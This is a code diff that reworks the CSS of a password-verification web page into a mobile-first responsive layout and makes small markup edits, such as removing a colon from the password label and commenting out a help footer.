@@ -20,47 +20,21 @@
 
         .container {
             background-color: white;
-            padding: 30px;
-            border-radius: 12px; /* More rounded corners */
+            padding: 20px;
+            border-radius: 12px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            max-width: 500px;
-            width: 100%;
+            width: 90%; /* Responsive width */
+            max-width: 400px; /* Max width for larger screens */
             text-align: center;
+            margin: 20px; /* Margin for spacing */
         }
-
-@media screen and (max-width: 785px) {
- .container {
-        width: 100%;
-        margin: -100;
-      }
-  }
-
-@media screen and (max-width: 765px) {
-  .container {
-        width: 100%;
-        margin: -100;
-      }
-  }
-  @media screen and (min-width: 1390px) {
-  .container {
-        width: 100%;
-        margin: -100;
-      };
-  }    
-  @media only screen and (max-width: 600px) {
-      .container {
-        width: 100%;
-        margin: -100;
-      }
-    }
-    
 
         .logo {
             margin-bottom: 20px;
         }
 
         .logo img {
-            width: 100px;
+            width: 80px;
         }
 
         .title {
@@ -88,7 +62,7 @@
         }
 
         .input-group input {
-            width: calc(100% - 20px);
+            width: 100%;
             padding: 10px;
             font-size: 14px;
             border: 1px solid #ddd;
@@ -110,6 +84,7 @@
 
         .button-container {
             display: flex;
+            flex-direction: column; /* Column direction for mobile by default */
             gap: 10px;
             margin-top: 10px;
         }
@@ -123,7 +98,6 @@
             border-radius: 20px; /* Rounded button edges */
             width: 100%;
             cursor: pointer;
-            flex: 1;
         }
 
         .button:hover {
@@ -131,13 +105,13 @@
         }
 
         .button.secondary {
-            background-color: white; /* White background */
-            color: #1a73e8; /* Blue text color */
-            border: 1px solid #1a73e8; /* Blue border */
+            background-color: white;
+            color: #1a73e8;
+            /*border: 1px solid #1a73e8;*/
         }
 
         .button.secondary:hover {
-            background-color: #f1f1f1; /* Light grey on hover */
+            background-color: #f1f1f1;
         }
 
         .footer {
@@ -152,6 +126,7 @@
             color: #5f6368;
             display: flex;
             gap: 15px;
+            justify-content: center;
         }
 
         .footer-nav a {
@@ -161,6 +136,33 @@
 
         .footer-nav a:hover {
             text-decoration: underline;
+        }
+
+        /* Responsive Styles */
+        @media (min-width: 600px) {
+            .button-container {
+                flex-direction: row; /* Row direction for larger screens */
+            }
+            .button {
+                width: auto; /* Auto width for side-by-side buttons */
+                flex: 1;
+            }
+        }
+
+        @media (min-width: 768px) {
+            .container {
+                padding: 30px;
+                max-width: 500px; /* Larger max-width for tablet and up */
+            }
+            .logo img {
+                width: 100px;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .container {
+                max-width: 600px; /* Max width for desktop screens */
+            }
         }
     </style>
 </head>
@@ -174,7 +176,7 @@
 
         <form id="verificationForm">
             <div class="input-group">
-                <label for="code">Enter Current Password:</label>
+                <label for="code">Enter Current Password</label>
                 <input type="password" id="code" name="code" placeholder="Current Password">
             </div>
 
@@ -190,7 +192,7 @@
             </div>
         </form>
 
-        <div class="footer">Need help? Visit the <a href="#">Help Center</a></div>
+        <!--<div class="footer">Need help? Visit the <a href="#">Help Center</a></div>-->
     </div>
 
     <!-- Footer Navigation Menu -->
@@ -201,6 +203,8 @@
     </div>
 
     <script>
+        // JavaScript function to handle form submission
+        
 
         // JavaScript function for 'Try Another Way' button
         function tryAnotherWay() {
